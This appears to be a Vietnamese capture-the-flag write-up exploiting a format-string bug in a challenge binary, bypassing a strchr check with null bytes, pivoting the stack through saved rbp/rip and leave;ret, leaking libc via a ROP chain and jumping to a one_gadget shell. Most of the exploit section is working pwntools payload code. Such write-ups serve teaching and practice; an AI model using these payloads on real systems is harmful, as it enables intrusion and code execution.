**1. Tìm bug**
  - Xem qua ida, hàm main không có gì hot chủ yếu call vuln
  - ![image](https://user-images.githubusercontent.com/113702087/214854559-43ddf861-53ed-44a1-b81e-987c0c1dc774.png)
  - ở đây ta thấy ngay lỗi fmt, có một chút trở ngại để thực hiện %n vì khi nhập chuỗi s được kiểm tra qua hàm strchr
  - ta có thể lợi dụng điểm dừng của hàm strchr là null byte để đưa %n vào, đồng thời dùng %c để kéo dãn độ dài s bù vào null byte đó thì có thể thực thi được %n
  - Sau khi debug vài lần thì thấy rằng ```'%6c' + b'\x00'*6' + fmt'``` thì có thể thực thi fmt được với fmt có %n được setup sẵn
  - ![image](https://user-images.githubusercontent.com/113702087/214909361-7d68a056-02bf-43b9-9ade-38e12a00aea0.png)
  - ![image](https://user-images.githubusercontent.com/113702087/214909428-029d364d-396a-441c-a476-10e5d81b1aab.png)

**2. Ý tưởng**
  - Tôi sẽ thay đổi saverbp thành 1 địa chỉ nằm trong khoảng buf và saverip thành leave ; ret lúc này rsp sẽ thành (rbp + 8) và vì nằm trong khoảng buf nên ta có thể ghi các ROP vào
  - Do mỗi khi thực hiện fmt thì các dữ liệu đều được ghi vào đó khiến việc setup địa chỉ trong stack khá khó khăn vì có thể bị các dữ liệu mới ghi đè vào
  - ![image](https://user-images.githubusercontent.com/113702087/215037508-00decbc8-7d7e-4c05-bd12-bc4a797bb640.png)
  - Tôi đã test thử '%20c%24$n'
  - ![image](https://user-images.githubusercontent.com/113702087/215037561-7a564f07-c5ef-4972-818a-950e0c71068b.png)
  - Chúng ta có thể thấy sự thay đổi của stack
  - Byte của saverip cần chuyển là 0xad làm tròn sẽ là 0xb0, đây sẽ là byte lớn nhất và được ghi sau cùng của fmt, từ (buf + 176) trở đi ta có thể ghi các địa chỉ cần ghi đè và ROP
  - Ở đây tôi chỉ ghi 2 địa chỉ do đó các ROP sẽ bắt đầu ghi từ (buf + 192) -> saverbp mới là (buf + 184) -> ghi được 8 stack, khá ít nhưng thế cũng là đủ

**3. Exploit**
  - **leak địa chỉ buf và tính cách giá trị cho fmt**
  ```
  r.recvuntil(b'at ')
out = r.recv(14)
buff_addr = int(out, 16)
print(hex(buff_addr))


saverip = buff_addr + 280
saverbp = buff_addr + 288
rbp_addr = buff_addr + 272
leave_ret = 0x00000000004012ad

libc.sym['one_gadget'] = 0xe3b01



new_saverbp = buff_addr + 184
print('buff_add: ' + hex(new_saverbp))
s_newsaverbp = str(hex(new_saverbp))
off_set = int('0x' + s_newsaverbp[12:14], 16)
print(off_set)
  ```
  
  ```
  if off_set - 9 < 0:
    r.close()
elif off_set > 0xad :
    r.close()
  ```
  - ở đây offset cho %n phải > 9 do %6c đã tạo ra 9 byte nên lúc ghi vào sẽ >= 9 byte, đồng thời phải < 0xad là byte của saverip mới ( leave ; ret )
  - **Tạo payload**
  ```
  payload = b'%6c'.ljust(8, b'\x00') + b'\x00' + b'%' + str(off_set - 9).encode('utf-8') + b'c%27$hhn' + b'%' + str(0xad - off_set).encode('utf-8') + b'c%28$hhn' 
payload = payload.ljust(56, b'\x00') + b'\x00'*120 + p64(rbp_addr) + p64(saverip) + p64(pop_rdi) + p64(exe.got['printf']) + p64(exe.sym['printf']) + p64(ret) + p64(exe.sym['vuln']) + p64(pop_rbp) + p64(buff_addr) + p64(leave_ret)
  ```
  - Ban đầu leak libc rồi thực thi lại vuln để ghi onegadget tiếp đó thay đổi rbp và leave ; ret vào onegadget
  - **Leak libc**
  ```
  out = r.recv(6)
print(out)
libc_leak = u64(out + b'\x00'*2)
libc.address = libc_leak - libc.sym['printf']
print('libc_base: ' + hex(libc.address))
print('one_gadget: ' + hex(libc.sym['one_gadget']))
  ```
  - **Gửi payload có onegadget**
  ```
  payload = b'n'*55 + p64(libc.sym['one_gadget'])
r.sendlineafter(b': ', payload)
  ```
  - **Get shell**
  - ![image](https://user-images.githubusercontent.com/113702087/215040212-56973d58-24ab-41ea-a351-4b14b6990022.png)
  
